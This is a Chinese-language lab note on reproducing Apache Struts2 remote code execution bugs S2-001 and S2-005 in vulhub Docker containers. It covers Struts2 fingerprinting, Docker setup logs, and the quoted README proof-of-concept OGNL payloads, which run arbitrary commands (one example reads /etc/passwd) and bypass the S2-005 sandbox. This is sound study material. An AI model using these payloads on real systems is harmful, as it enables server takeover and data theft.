# Struts2漏洞

## 简介

struts2是一个MVC框架，个人理解有点类似于apache2之于web

漏洞靶场

https://hub.docker.com/r/2d8ru/struts2

https://vulhub.org/



## 漏洞判断

- 若网页后缀为do或者action，则可能为struts2框架（不一定准确）

- 判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true（该devMode有点类似调试模式）

- 通过actionErrors参数，比如https://example.com/?actionErrors=1111，如果出现异常则可以认定为struts2框架

  异常包括：

  - 404/500

  - 出现业务相关错误或者回显传入的参数

  - 页面的内容结构发生变化

  - 页面发生重定向



## 漏洞利用

工具：K8_Struts2_EXP.exe

手动使用payload



## 漏洞复现

一开始打算在windows下部署环境的，为此还新开了个win8.1的虚拟机，还下载了tomcat，最后报错了……

无奈在kali直接运行docker，还是非常方便的

### s2-001

```bash
┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-001]
└─$ sudo docker-compose build                                                                                                                             1 ⨯
Building struts2
Sending build context to Docker daemon  3.697MB
Step 1/5 : FROM vulhub/tomcat:8.5
 ---> 66ba03f6c1d8
Step 2/5 : LABEL maintainer="phithon <root@leavesongs.com>"
 ---> Using cache
 ---> 4db157ba028e
Step 3/5 : RUN set -ex     && rm -rf /usr/local/tomcat/webapps/*     && chmod a+x /usr/local/tomcat/bin/*.sh
 ---> Using cache
 ---> 74261cbbf201
Step 4/5 : COPY S2-001.war /usr/local/tomcat/webapps/ROOT.war
 ---> Using cache
 ---> c06a50c17f08
Step 5/5 : EXPOSE 8080
 ---> Using cache
 ---> 84ad0a09a7ba
Successfully built 84ad0a09a7ba
Successfully tagged s2-001_struts2:latest
                                                                                                                                                              
┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-001]
└─$ sudo docker-compose up -d
s2-001_struts2_1 is up-to-date
                                                                                                                                                              
┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-001]
└─$ sudo docker-compose ps   
      Name             Command       State                    Ports                  
-------------------------------------------------------------------------------------
s2-001_struts2_1   catalina.sh run   Up      0.0.0.0:8080->8080/tcp,:::8080->8080/tcp
```

在vulhub中的README文件给出了漏洞利用的poc

````markdown
# S2-001 远程代码执行漏洞

## 原理

参考 [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)

> 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行

## 环境

执行以下命令启动s2-001测试环境

```
docker-compose build
docker-compose up -d
```

## POC && EXP

获取tomcat执行路径：

```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```

获取Web路径：

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

执行任意命令（命令加参数：`new java.lang.String[]{"cat","/etc/passwd"}`）：

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

![](1.jpeg)

````

---



### s2-005

```bash
┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-005]
└─$ sudo docker-compose build                                                                                                                             1 ⨯
Building struts2
Sending build context to Docker daemon  3.585MB
Step 1/5 : FROM vulhub/tomcat:8.5
 ---> 66ba03f6c1d8
Step 2/5 : LABEL maintainer="phithon <root@leavesongs.com>"
 ---> Using cache
 ---> 4db157ba028e
Step 3/5 : RUN set -ex     && rm -rf /usr/local/tomcat/webapps/*     && chmod a+x /usr/local/tomcat/bin/*.sh
 ---> Using cache
 ---> 74261cbbf201
Step 4/5 : COPY S2-005.war /usr/local/tomcat/webapps/ROOT.war
 ---> 5abf0311de5d
Step 5/5 : EXPOSE 8080
 ---> Running in 1218761fbfcd
Removing intermediate container 1218761fbfcd
 ---> 576a01884668
Successfully built 576a01884668
Successfully tagged s2-005_struts2:latest
                                                                                                                                                              
┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-005]
└─$ sudo docker-compose up -d
Creating network "s2-005_default" with the default driver
Creating s2-005_struts2_1 ... done
                                                                                                                                                              
┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-005]
└─$ sudo docker-compose ps           
      Name             Command       State                    Ports                  
-------------------------------------------------------------------------------------
s2-005_struts2_1   catalina.sh run   Up      0.0.0.0:8080->8080/tcp,:::8080->8080/tcp
```



README

````markdown
# S2-005 远程代码执行漏洞

影响版本: 2.0.0 - 2.1.8.1
漏洞详情: http://struts.apache.org/docs/s2-005.html

## 原理

参考吴翰清的《白帽子讲Web安全》一书。

> s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上

XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：

```
user.address.city=Bishkek&user['favoriteDrink']=kumys 
//会被转化成
action.getUser().getAddress().setCity("Bishkek")  
action.getUser().setFavoriteDrink("kumys")
```

触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：

- S2-003 使用`\u0023`绕过s2对`#`的防御
- S2-003 后官方增加了安全模式（沙盒）
- S2-005 使用OGNL表达式将沙盒关闭，继续执行代码

## 环境

执行以下命令启动s2-001测试环境

```
docker-compose build
docker-compose up -d
```

## POC && EXP

执行任意命令POC（无回显，空格用`@`代替）：

```
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
Host: target:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36


```

网上一些POC放到tomcat8下会返回400，研究了一下发现字符`\`、`"`不能直接放path里，需要urlencode，编码以后再发送就好了。这个POC没回显。

POC用到了OGNL的Expression Evaluation：

![](1.jpeg)

大概可以理解为，`(aaa)(bbb)`中aaa作为OGNL表达式字符串，bbb作为该表达式的root对象，所以一般aaa位置如果需要执行代码，需要用引号包裹起来，而bbb位置可以直接放置Java语句。`(aaa)(bbb)=true`实际上就是`aaa=true`。不过确切怎么理解，还需要深入研究，有待优化。

期待大佬研究出有回显的POC。
````

上方payload在/tmp路径下新建success文件

tips: 进入正在运行的docker的命令是

```bash
sudo docker exec -it s2-005_struts2_1 /bin/bash
```

退出就直接exit就好了

---



一些需要注意的点：

- 当完成了漏洞的利用之后记得关闭原来的容器，否则开启新的容器时很可能因为端口冲突而报错（当两个容器映射到本地的端口相同时）

  ```bash
  ┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-007]
  └─$ sudo docker-compose up -d
  Creating network "s2-007_default" with the default driver
  Creating s2-007_struts2_1 ... 
  Creating s2-007_struts2_1 ... error
  
  ERROR: for s2-007_struts2_1  Cannot start service struts2: driver failed programming external connectivity on endpoint s2-007_struts2_1 (256ed94eaf6f11a33b93f8383a642ff429173ff06b0b7411248e2f477035bb42): Bind for 0.0.0.0:8080 failed: port is already allocated
  
  ERROR: for struts2  Cannot start service struts2: driver failed programming external connectivity on endpoint s2-007_struts2_1 (256ed94eaf6f11a33b93f8383a642ff429173ff06b0b7411248e2f477035bb42): Bind for 0.0.0.0:8080 failed: port is already allocated
  ERROR: Encountered errors while bringing up the project.
  ```

  关闭容器可以使用如下命令：

  ```bash
  ┌──(kali㉿kali)-[/var/…/html/vulhub/struts2/s2-007]
  └─$ sudo docker-compose down 
  Removing s2-007_struts2_1 ... done
  Removing network s2-007_default
  ```

  该命令会关闭并且删除容器

- 另一个比较奇怪的点是不同目录下运行docker-compose ps的结果好像是不一样的，就好比在目录s2-005下运行能够查看到的容器在目录s2-007下再次运行就查看不了了

---

利用的过程都是跟着网上的帖子和README来的，这里就不放图了

~~把图放到图库再引用挺麻烦的~~

本来打算多尝试几个漏洞的，但是发现有一些的环境似乎有点问题（500），还有一些利用结果比较不好验证（比如弹计算器），所以就浅尝辄止了



相关资料

> [Struts2框架漏洞总结与复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/283821.html)
>
> [Docker入门之docker-compose - minseo - 博客园 (cnblogs.com)](https://www.cnblogs.com/minseo/p/11548177.html)
>
> [Struts2 漏洞复现之s2-001__嘿！的博客-CSDN博客](https://blog.csdn.net/weixin_51220765/article/details/111168595)



